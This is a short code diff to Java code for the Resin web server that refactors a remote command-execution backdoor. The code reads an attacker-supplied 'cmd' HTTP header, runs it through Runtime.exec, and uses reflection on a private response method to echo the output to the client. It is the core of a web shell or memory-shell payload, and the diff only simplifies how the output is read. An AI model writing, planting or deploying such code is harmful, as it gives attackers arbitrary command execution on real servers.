@@ -20,20 +20,13 @@
         if(obj instanceof com.caucho.server.http.HttpRequest){
             com.caucho.server.http.HttpRequest httpRequest = (com.caucho.server.http.HttpRequest)obj;
             String cmd = httpRequest.getHeader("cmd");
-
-            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
-
-            StringBuilder sb = new StringBuilder();
-            String line;
-            while((line = br.readLine()) != null){
-                sb.append(line + "\n");
-            }
+            String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
 
             com.caucho.server.http.HttpResponse httpResponse = httpRequest.createResponse();
             java.lang.reflect.Method method = httpResponse.getClass().getDeclaredMethod("createResponseStream");
             method.setAccessible(true);
             com.caucho.server.http.HttpResponseStream httpResponseStream = (com.caucho.server.http.HttpResponseStream) method.invoke(httpResponse);
-            httpResponseStream.write(sb.toString().getBytes(), 0, sb.length());
+            httpResponseStream.write(res.getBytes(), 0, res.length());
             httpResponseStream.close();
         }
     }
